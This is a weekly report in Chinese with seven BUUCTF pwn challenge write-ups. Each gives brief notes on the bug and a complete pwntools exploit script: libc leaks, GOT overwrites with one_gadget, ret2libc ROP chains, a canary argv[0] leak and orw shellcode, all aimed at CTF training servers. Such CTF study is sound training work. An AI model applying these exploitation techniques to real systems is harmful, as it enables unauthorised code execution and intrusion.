# week6
## 1.BUUCTF-wustctf2020_name_your_cat
数组溢出 没有检查数组的边界

<img width="660" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/31e438f9-e4c0-4e29-aa91-78872ab5cf80">

计算好偏移溢出覆盖返回地址为后门函数即可

<img width="299" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/5105f48a-c2e1-44c3-b75c-be50a4acae57">

### exp_wustctf2020_name_your_cat.py
```python
from pwn import *
# p = process("./wustctf2020_name_your_cat")
p = remote("node4.buuoj.cn",27681)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

shell_addr = 0x80485CB
offset = 7

for i in range(5):
	ru('>')
	sl(str(offset))
	ru('Give your name plz: ')
	sl(p32(shell_addr))

shell()
```

## 2.BUUCTF-axb_2019_fmt64
无限制格式化字符串利用

<img width="380" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/292e03bd-6b40-4153-aa05-8e60d9c09970">

泄漏libc 覆盖printf_got为one_gadget 需要注意的就是构造格式化字符串写时要注意之前写入的字符个数

### exp_axb_2019_fmt64.py
```python
from pwn import *
# p = process("./axb_2019_fmt64")
p = remote("node4.buuoj.cn",25285)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so")


r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

offset = 8

puts_got = 0x000000000601018
printf_got = 0x000000000601030

# 1.leak libc
payload = b'%9$saaaa' + p64(puts_got)
ru('Please tell me:')
raw_input("Ther")
sl(payload)

libc_puts = u64(ru('\x7f')[-6:].ljust(8, b'\x00'))
success("libc_puts ==> {}".format(hex(libc_puts)))

libc_base = libc_puts - libc.symbols['puts']
success("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + libc.symbols['system']
success("libc_system ==> {}".format(hex(libc_system)))

# ones = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
ones = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

one_gadget = libc_base + ones[0]
success("one_gadget ==> {}".format(hex(one_gadget)))

one1 = one_gadget & 0xffff
one2 = (one_gadget >> 16) & 0xffff

success("one1 ==> {}".format(hex(one1)))
success("one2 ==> {}".format(hex(one2)))

# 2.printf_got --> one_gadget
payload	= b'%' + str(one1-9) + 'c%12$hnaaaa'
if (one2 - one1) > 0:
	payload+= b'%' + str(one2-one1-4) + 'c%13$hnaaa'
else:
	payload+= b'%' + str(one2-one1+0x10000-4) + 'c%13$hnaaa'

payload+= p64(printf_got) + p64(printf_got+2) 

success("payload ==> {}".format(payload))

ru('Please tell me:')
raw_input("Ther")
sl(payload)

shell()
```

## 3.BUUCTF-cmcc_pwnme1
getfruit函数存在栈溢出

<img width="311" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/0f35319b-f265-41e3-b0ba-20e137335745">

正常溢出覆盖返回地址为getflag即可 但在BUUCTF中flag路径不对 于是ret2libc

### exp_pwnme1.py
```python
from pwn import *
# p = process("./pwnme1")
p = remote("node4.buuoj.cn",25762)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

# libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-32.so")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

offset = 168
get_flag = 0x8048677

puts_plt = 0x8048548
puts_got = 0x804a028
main = 0x80486F4

ru(">> 6. Exit    \n")
raw_input("Ther")
sl('5')

# 1.leak libc
payload = b'A' * offset + p32(puts_plt) + p32(main) + p32(puts_got)
ru("Please input the name of fruit:")
sl(payload)

libc_puts = u32(ru('\xf7')[-4:])
success("libc_puts ==> {}".format(hex(libc_puts)))

libc_base = libc_puts - libc.symbols['puts']
success("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + libc.symbols['system']
success("libc_system ==> {}".format(hex(libc_system)))

libc_binsh = libc_base + libc.search('/bin/sh').next()
success("libc_binsh ==> {}".format(hex(libc_binsh)))

# 2.system("/bin/sh")
ru(">> 6. Exit    \n")
raw_input("Ther")
sl('5')

payload = b'A' * offset + p32(libc_system) + p32(0xdeadbeef) + p32(libc_binsh)
ru("Please input the name of fruit:")
sl(payload)

shell()
```

## 4.BUUCTF-axb_2019_brop64
栈溢出

<img width="603" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/28ad1a8c-fffe-4b18-9e98-ca90a03d0732">

常规ret2libc

### exp_axb_2019_brop64.py
```python
from pwn import *
# p = process("./axb_2019_brop64")
p = remote("node4.buuoj.cn",25597)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

offset = 216

pop_rdi_ret = 0x0000000000400963
main = 0x0000000004007D6

puts_plt = 0x400640
puts_got = 0x000000000601018

# 1.leak libc
payload = b'A' * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)

ru("Please tell me:")
#raw_input("Ther")
sl(payload)

libc_puts = u64(ru('\x7f')[-6:].ljust(8, '\x00'))
success("libc_puts ==> {}".format(hex(libc_puts)))

libc_base = libc_puts - libc.symbols['puts']
success("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + libc.symbols['system']
success("libc_system ==> {}".format(hex(libc_system)))

libc_binsh = libc_base + libc.search('/bin/sh').next()
success("libc_binsh ==> {}".format(hex(libc_binsh)))

# 2.system("/bin/sh")
payload = b'A' * offset + p64(pop_rdi_ret) + p64(libc_binsh) + p64(libc_system) 

ru("Please tell me:")
raw_input("Ther")
sl(payload)

shell()
```

## 5.BUUCTF-wdb2018_guess
将flag读入到buf中 开启了canary 并且给了3次栈溢出的机会（通过fork进程）

<img width="518" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/fec5e5aa-9943-4780-9a1d-5210159968ae">

首先想到可以覆盖__libc_argv[0] 但不知道buf的地址在哪里 学习到可以通过泄漏libc

从而泄漏libc的__environ的值 这个值保存着一个栈地址（指向环境变量）

所以3次栈溢出可以构造为 

1.覆盖__libc_argv[0]为put_got 泄漏libc地址

2.覆盖__libc_argv[0]为libc__environ 泄漏栈地址

3.找到泄漏的栈地址与buf的偏移 覆盖__libc_argv[0]为buf地址 泄漏flag

### exp_GUESS.py
```python
from pwn import *
# p = process("./GUESS")
p = remote("node4.buuoj.cn",28526)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

puts_got = 0x000000000602020

# 1.leak libc
payload = b'A' * 0x128 + p64(puts_got)
ru("Please type your guessing flag\n")
sl(payload)

ru("*** stack smashing detected ***: ")

libc_puts = u64(ru('\x7f').ljust(8, '\x00'))
success("libc_puts ==> {}".format(hex(libc_puts)))

libc_base = libc_puts - libc.symbols['puts']
success("libc_base ==> {}".format(hex(libc_base)))

libc_environ = libc_base + libc.symbols['__environ']
success("libc_environ ==> {}".format(hex(libc_environ)))

# 2.leak stack
payload = b'A' * 0x128 + p64(libc_environ)
ru("Please type your guessing flag\n")
sl(payload)

ru("*** stack smashing detected ***: ")

stack_addr = u64(ru('\x7f').ljust(8, '\x00'))
success("stack_addr ==> {}".format(hex(stack_addr)))

# 3.leak flag
flag_addr = stack_addr - 0x168

payload = b'A' * 0x128 + p64(flag_addr)
ru("Please type your guessing flag\n")
raw_input("Ther")
sl(payload)


shell()
```

## 6.BUUCTF-[极客大挑战 2019]Not Bad
orw 需要修改一下pwntools生成的shellcode 长度缩小一些

### exp_bad.py
```python
from pwn import *
# p = process("./bad")
p = remote("node4.buuoj.cn",27878)
context.log_level = 'debug'
context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

jmp_rsp = 0x0000000000400a01

sc = asm(shellcraft.open('flag'))
sc+= asm(shellcraft.read('rax', 'rsp', 0x30))
# sc+= asm(shellcraft.write(1, 'rsp', 0x30))
sc += asm('''
	push 1
    pop rdi
    /* call write() */
    push 1 /* 1 */
    pop rax
    syscall
	''')

payload = sc.ljust(40, '\x90') + p64(jmp_rsp) + asm("sub rsp, 48; call rsp")
ru("Easy shellcode, have fun!\n")

sl(payload)

shell()
```

## 7.BUUCTF-oneshot_tjctf_2016
任意地址泄漏 之后会将v4的值当作一个地址返回

<img width="387" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/15176deb-32dd-47a0-a543-7a998c61d1c7">

1.泄漏libc 2.将v4覆盖为one_gadget

### exp_oneshot_tjctf_2016.py
```python
from pwn import *
# p = process("./oneshot_tjctf_2016")
p = remote("node4.buuoj.cn",27026)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so")


r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

puts_got = 6294232

# 1.leak libc
ru("Read location?\n")
sl(str(puts_got))

ru("Value: ")

libc_puts = int(rx(18), 16)
success("libc_puts ==> {}".format(hex(libc_puts)))

libc_base = libc_puts - libc.symbols['puts']
success("libc_base ==> {}".format(hex(libc_base)))

# ones = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
ones = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

one_gadget = libc_base + ones[0]

# 2.one_gadget
ru("Jump location?\n")

sl(str(one_gadget))


shell()
```
